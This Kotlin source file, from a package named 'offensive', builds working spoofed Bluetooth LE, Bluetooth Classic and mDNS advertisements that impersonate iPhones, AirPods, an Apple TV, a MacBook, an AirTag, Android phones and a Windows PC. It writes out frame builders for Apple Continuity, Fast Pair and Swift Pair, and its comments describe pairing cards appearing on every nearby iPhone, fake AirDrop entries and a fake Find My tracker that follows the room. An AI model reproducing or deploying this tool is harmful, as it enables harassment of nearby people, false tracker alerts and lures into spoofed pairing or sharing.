package com.droid.whaly.offensive

import java.util.UUID

/**
 * A platform persona: a coherent identity broadcast over BLE, Bluetooth Classic and mDNS
 * instead of randomised spam packets.
 *
 * Each persona carries the frames its operating system actually uses to discover peers:
 *
 *  - iOS / macOS   Apple Continuity. Nearby Action 0x0F with action 0x01 is the AirDrop
 *                  action, 0x05 is AirDrop presence, 0x10 is Nearby Info. Together they
 *                  make the device show up in the AirDrop share sheet on hosts that still
 *                  honour BLE discovery.
 *  - Android       Fast Pair, service 0xFE2C, three bytes of model id.
 *  - Windows       Microsoft Swift Pair, manufacturer 0x0006.
 *
 * The Bluetooth Classic name is set to the persona label, so a paired or connected host
 * shows that name in its own UI.
 */
sealed interface PersonaFrame {
    data class Manufacturer(val companyId: Int, val data: ByteArray) : PersonaFrame
    data class ServiceData(
        val uuid: UUID,
        val data: ByteArray,
        val includeUuid: Boolean = true,
    ) : PersonaFrame
}

data class Persona(
    val id: String,
    val label: String,
    val subtitle: String,
    val bluetoothName: String?,
    val mdnsTypes: List<String>,
    val frames: List<PersonaFrame>,
    val platform: String,
)

object Personas {

    const val APPLE_COMPANY_ID = 0x004C
    const val MICROSOFT_COMPANY_ID = 0x0006
    val FAST_PAIR_UUID: UUID = UUID.fromString("0000FE2C-0000-1000-8000-00805F9B34FB")

    /** Apple Continuity frame: type byte, length byte, then the body. */
    private fun continuity(type: Int, body: ByteArray): ByteArray {
        require(body.size <= 0xFF) { "continuity body too long" }
        return byteArrayOf(type.toByte(), body.size.toByte()) + body
    }

    private fun randomBytes(size: Int): ByteArray =
        ByteArray(size).also { java.util.Random().nextBytes(it) }

    private fun hex(value: String): ByteArray {
        val clean = value.filterNot(Char::isWhitespace).removePrefix("0x").removePrefix("0X")
        require(clean.length % 2 == 0) { "odd hex length" }
        return ByteArray(clean.length / 2) { index ->
            clean.substring(index * 2, index * 2 + 2).toInt(16).toByte()
        }
    }

    /** 0x0F Nearby Action. Action 0x01 is AirDrop; 0x02 is Handoff; 0x06 is AirPlay. */
    fun nearbyAction(action: Int, flags: Int = 0x00): ByteArray =
        continuity(0x0F, byteArrayOf(action.toByte(), flags.toByte()) + randomBytes(3))

    /** 0x05 AirDrop presence. */
    fun airDrop(flags: Int = 0x00): ByteArray =
        continuity(0x05, byteArrayOf(flags.toByte(), 0x00) + randomBytes(22))

    /** 0x0C Handoff availability. */
    fun handoff(): ByteArray = continuity(0x0C, randomBytes(14))

    /** 0x10 Nearby Info, the frame that carries AirDrop/Handoff visibility state. */
    fun nearbyInfo(statusFlags: Int = 0xC0): ByteArray =
        continuity(0x10, byteArrayOf(statusFlags.toByte()) + randomBytes(3) + randomBytes(17))

    /** 0x09 AirPlay target, IPv4 address of the advertiser. */
    fun airPlayTarget(address: ByteArray = byteArrayOf(0xC0.toByte(), 0xA8.toByte(), 0x01, 0x64)): ByteArray =
        continuity(0x09, byteArrayOf(0x01) + address)

    /** 0x07 proximity pair payload used for AirPods and Beats. */
    fun proximityPair(modelHex: String, colorHex: String = "00"): ByteArray {
        val model = hex(modelHex)
        val buds = byteArrayOf(((java.util.Random().nextInt(10) shl 4) or java.util.Random().nextInt(10)).toByte())
        val case = byteArrayOf(((java.util.Random().nextInt(8) shl 4) or java.util.Random().nextInt(10)).toByte())
        return continuity(
            0x07,
            byteArrayOf(0x01) + model + byteArrayOf(0x55) + buds + case + randomBytes(1) + hex(colorHex) +
                byteArrayOf(0x00) + randomBytes(16),
        )
    }

    /** 0x12 Find My network frame. Rotating keys make receivers report a travelling tracker. */
    fun findMy(status: Int = 0x00): ByteArray =
        continuity(0x12, byteArrayOf(status.toByte()) + randomBytes(22))

    /** Fast Pair model-id advertisement: exactly three bytes, nothing else. */
    fun fastPair(modelId: Int): PersonaFrame.ServiceData {
        val data = byteArrayOf(
            ((modelId shr 16) and 0xFF).toByte(),
            ((modelId shr 8) and 0xFF).toByte(),
            (modelId and 0xFF).toByte(),
        )
        return PersonaFrame.ServiceData(FAST_PAIR_UUID, data)
    }

    /** Microsoft Swift Pair, the Windows "add a device" beacon. */
    fun swiftPair(): PersonaFrame.Manufacturer =
        PersonaFrame.Manufacturer(MICROSOFT_COMPANY_ID, byteArrayOf(0x03, 0x03, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06))

    private fun apple(data: ByteArray): PersonaFrame.Manufacturer =
        PersonaFrame.Manufacturer(APPLE_COMPANY_ID, data)

    val all: List<Persona> = listOf(
        Persona(
            id = "iphone",
            label = "iPhone 15 Pro",
            subtitle = "AirDrop action + presence + Handoff",
            bluetoothName = "iPhone 15 Pro",
            mdnsTypes = listOf("_airdrop._tcp", "_companion-link._tcp"),
            platform = "iOS",
            frames = listOf(
                apple(nearbyAction(0x01)),
                apple(airDrop(0x00)),
                apple(nearbyInfo(0xC0)),
                apple(handoff()),
            ),
        ),
        Persona(
            id = "airpods",
            label = "AirPods Pro 2",
            subtitle = "Proximity pairing card on every nearby iPhone",
            bluetoothName = "AirPods Pro",
            mdnsTypes = listOf("_airplay._tcp"),
            platform = "iOS",
            frames = listOf(
                apple(proximityPair("1420")),
                apple(proximityPair("2420")),
                apple(proximityPair("0E20")),
            ),
        ),
        Persona(
            id = "appletv",
            label = "Apple TV 4K",
            subtitle = "AirPlay receiver in Control Center",
            bluetoothName = "Living Room",
            mdnsTypes = listOf("_airplay._tcp", "_raop._tcp", "_airdrop._tcp"),
            platform = "tvOS",
            frames = listOf(
                apple(airPlayTarget()),
                apple(nearbyInfo(0x40)),
                apple(nearbyAction(0x06)),
            ),
        ),
        Persona(
            id = "macbook",
            label = "MacBook Pro",
            subtitle = "Handoff peer, AirDrop action, Universal Clipboard",
            bluetoothName = "MacBook Pro",
            mdnsTypes = listOf("_companion-link._tcp", "_airdrop._tcp"),
            platform = "macOS",
            frames = listOf(
                apple(nearbyAction(0x01)),
                apple(handoff()),
                apple(airDrop(0x01)),
                apple(nearbyInfo(0xC0)),
            ),
        ),
        Persona(
            id = "airtag",
            label = "AirTag",
            subtitle = "Find My tracker that follows the room",
            bluetoothName = null,
            mdnsTypes = emptyList(),
            platform = "iOS",
            frames = listOf(
                apple(findMy(0x00)),
                apple(findMy(0x10)),
            ),
        ),
        Persona(
            id = "galaxy",
            label = "Galaxy S24 Ultra",
            subtitle = "Fast Pair + Android beacon",
            bluetoothName = "Galaxy S24 Ultra",
            mdnsTypes = listOf("_googlecast._tcp"),
            platform = "Android",
            frames = listOf(
                fastPair(0xCB093B),
                fastPair(0x8A8F23),
                fastPair(0xDE215D),
            ),
        ),
        Persona(
            id = "pixel",
            label = "Pixel 8 Pro",
            subtitle = "Fast Pair beacon",
            bluetoothName = "Pixel 8 Pro",
            mdnsTypes = listOf("_googlecast._tcp"),
            platform = "Android",
            frames = listOf(
                fastPair(0x5C7CDC),
                fastPair(0x9CB5F3),
                fastPair(0x0F2D16),
            ),
        ),
        Persona(
            id = "windows",
            label = "Windows 11 PC",
            subtitle = "Swift Pair beacon",
            bluetoothName = "DESKTOP-WHALY",
            mdnsTypes = emptyList(),
            platform = "Windows",
            frames = listOf(swiftPair()),
        ),
    )

    fun byId(id: String): Persona? = all.firstOrNull { it.id == id }
}
